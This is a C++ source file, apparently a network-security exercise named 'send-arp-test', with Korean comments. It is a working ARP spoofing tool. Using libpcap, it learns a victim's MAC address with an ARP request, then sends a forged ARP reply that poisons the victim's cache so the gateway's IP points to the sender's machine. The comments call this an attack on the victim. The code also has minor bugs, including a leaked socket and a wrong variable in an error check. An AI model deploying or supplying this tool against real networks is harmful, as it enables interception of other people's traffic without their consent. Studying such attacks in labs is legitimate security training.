#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
//
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <iostream>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)
typedef struct{
	char * dev_;
}Param;
Param param = {
	.dev_=NULL
};
 
//Mac Address를 가져오는 함수
int Mac_Address_(unsigned char* mac,char * ip,const char * interface)
{
    int sock_;//소켓 디스크립터 변수
    struct ifreq ifr_; //ifreq구조체 변수
    int fd_;
    char * my_mac_;
	//char * my_ip_;
    //ifr_ 구조체 변수 초기화
    memset(&ifr_,0x00,sizeof(ifr_));
    strcpy(ifr_.ifr_name,interface);
    fd_ = socket(AF_INET,SOCK_STREAM,0);//소캣생성
    sock_ = socket(AF_INET,SOCK_STREAM,0);//소캣생성

    if(sock_<0)
    {
        printf("SOCKET ERROR \n");
        return 1;
    }
    if(ioctl(fd_,SIOCGIFHWADDR,&ifr_)<0)
    {
        printf("IOCTL ERROR \n");
        return 1;
    }
    //소캣을 이용해서 나의 Mac주소를 확인 
    my_mac_ = ifr_.ifr_hwaddr.sa_data;

    mac[0] = (unsigned)my_mac_[0];
    mac[1] = (unsigned)my_mac_[1];
    mac[2] = (unsigned)my_mac_[2];
    mac[3] = (unsigned)my_mac_[3];
    mac[4] = (unsigned)my_mac_[4];
    mac[5] = (unsigned)my_mac_[5];

	inet_ntop(AF_INET,ifr_.ifr_addr.sa_data+2,ip,sizeof(struct sockaddr));
    close(sock_);
    return 0;
}

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ... ]\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
    //상대방의 Mac Address를 저장하기위한 공간
    unsigned char mac_[6];
	char ip_[40];
    const struct EthArpPacket * etharppacket_;
	char* dev = argv[1];
	std::string victim_ip_ = std::string(argv[2]);//172.20.10.4
	std::string gateway_ip_ = std::string(argv[3]);//172.20.10.1
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
    Mac_Address_(mac_,ip_,dev);

    Mac My_Mac_Address_ = Mac(mac_);
	/*
    if (My_Mac_Address_ == Mac("00:0c:29:d3:e5:d4"))
    {
        printf("Correct Mac Address");
        return 0;
    }
	*/
	Mac Victim_Mac_ ;
    //request를 통해서 상대방의 Mac주소를 알아오기
    EthArpPacket packet_;

    packet_.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //BroadCast공격
    packet_.eth_.smac_= My_Mac_Address_;
    packet_.eth_.type_ = htons(EthHdr::Arp);
    packet_.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_.arp_.pro_ = htons(EthHdr::Ip4);
    packet_.arp_.hln_ = Mac::SIZE;
    packet_.arp_.pln_ = Ip::SIZE;
	packet_.arp_.op_ = htons(ArpHdr::Request);
	packet_.arp_.smac_ = My_Mac_Address_;
    packet_.arp_.sip_ = htonl(Ip(ip_));//내 아이피 입력
	packet_.arp_.tmac_ = Mac("00:00:00:00:00:00"); 
	packet_.arp_.tip_ = htonl(Ip(victim_ip_));//상대방의 아이피 입력
	//상대방의 맥주소
	EthArpPacket victim_packet_ ;

	victim_packet_.arp_.sip_ = htonl(Ip(victim_ip_));

    int res_ = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_), sizeof(EthArpPacket));

    if (res_ != 0) {

		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_, pcap_geterr(handle));

	}
	//수신하는 패킷의 IP가 상대방의 IP와 일치할 경우, 해당 패킷의 Mac주소를 가져옴.
	while (true)
	{
		struct pcap_pkthdr * re_header_;
		const u_char * re_packet_;
		int re_res_ = pcap_next_ex(handle, &re_header_,&re_packet_);
		if(re_res_ == 0) continue;
		if (re_res_ == PCAP_ERROR || res_ == PCAP_ERROR_BREAK)
		{
			printf("\npcap_next_ex return %d(%s)\n",res_,pcap_geterr(handle));
			break;
		}
		etharppacket_=(struct EthArpPacket*)(re_packet_);
		
		if(etharppacket_->arp_.sip_==victim_packet_.arp_.sip_)
		{
			Victim_Mac_ = etharppacket_ -> eth_.smac_;
			break;
		}
	}
	//ARP Reply 변조를 통해서 상대방을 공격한다.
	EthArpPacket packet;

	packet.eth_.dmac_ = Victim_Mac_;
	packet.eth_.smac_ = My_Mac_Address_;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = My_Mac_Address_; //나의 맥주소
	packet.arp_.sip_ = htonl(Ip(gateway_ip_));//게이트웨이의 아이피
	packet.arp_.tmac_ = Victim_Mac_; //상대방 mac주소
	packet.arp_.tip_ = htonl(Ip(victim_ip_)); //상대방 아이피 입력

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0) {

		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));

	}

	pcap_close(handle);	
}